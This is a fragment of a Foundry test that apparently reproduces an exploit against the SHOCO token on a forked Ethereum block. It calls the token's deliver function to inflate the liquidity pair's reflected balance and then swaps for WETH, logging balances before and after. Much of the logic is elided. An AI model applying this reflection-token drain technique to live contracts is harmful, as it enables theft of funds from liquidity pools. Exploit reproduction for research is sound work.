...
contract SHOCOAttacker is Test {
    ...
    function testExploit() external {
        // set blocknumber for current active fork
        uint attackBlockNumber = 16440978;
        vm.rollFork(attackBlockNumber);
        console.log("before attack, weth balance is :", weth.balanceOf(address(this)));
        ...
        // caculate how many weth we should give
        ...
        // burn this address's shoco
        console.log("Before deliver, pair's shoco is :", shoco.balanceOf(address(shoco_weth)));
        shoco.deliver((shoco.balanceOf(address(this)) * 99999) / 100000);
        console.log("After deliver, pair's shoco is :", shoco.balanceOf(address(shoco_weth)));

        // after deliver, pair's shoco has been added and use the shoco to swap weth
        ...
        console.log("after attack, weth balance is :", weth.balanceOf(address(this)));
    }
}
